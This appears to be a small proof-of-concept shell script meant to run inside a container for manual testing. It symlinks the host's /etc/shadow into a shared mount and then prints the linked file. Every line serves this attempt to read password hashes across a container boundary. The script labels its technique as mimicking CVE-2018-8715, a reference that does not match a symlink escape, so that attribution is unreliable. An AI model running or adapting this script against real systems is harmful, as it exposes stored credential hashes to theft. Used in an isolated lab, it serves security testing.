#!/bin/sh
# Create a symlink inside the mounted directory that points to a sensitive host file
# This mimics the condition exploited by CVE-2018-8715
if [ -d "/host_shared" ]; then
  ln -sf /etc/shadow /host_shared/secret_link
  echo "[+] Symlink created: /host_shared/secret_link -> /etc/shadow"
  echo "[+] Attempting to read the linked file from inside the container:"
  cat /host_shared/secret_link || echo "[!] Unable to read the file (expected on nonâ€‘vulnerable hosts)"
fi
# Keep container alive for manual testing
while true; do sleep 3600; done